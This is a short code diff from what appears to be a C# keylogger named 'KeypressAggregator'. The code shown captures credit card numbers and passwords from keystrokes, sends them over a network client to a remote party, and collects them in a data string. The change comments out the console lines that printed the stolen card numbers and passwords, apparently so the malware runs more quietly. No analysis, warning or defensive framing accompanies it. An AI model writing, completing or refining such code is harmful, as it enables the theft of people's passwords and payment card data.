@@ -115,7 +115,7 @@ namespace KeypressAggregator
                     {
                         creditCard = 0;
                         var ci = createCi( "CCN", creditNum);
-                        Console.WriteLine("CNN: " + ci.Data);
+                        //Console.WriteLine("CNN: " + ci.Data);
                         client.Send(ci);
                         data = data + "DATA: " + ci.Data;
                         foundInfo = true;
@@ -138,7 +138,7 @@ namespace KeypressAggregator
                         {
                             var ci = createCi("PSW", password);
                             client.Send( ci );
-                            Console.WriteLine("PSW: " + ci.Data);
+                            //Console.WriteLine("PSW: " + ci.Data);
                             data = data + "DATA: " + ci.Data;
                             isPswrd = false;
                             password = "";
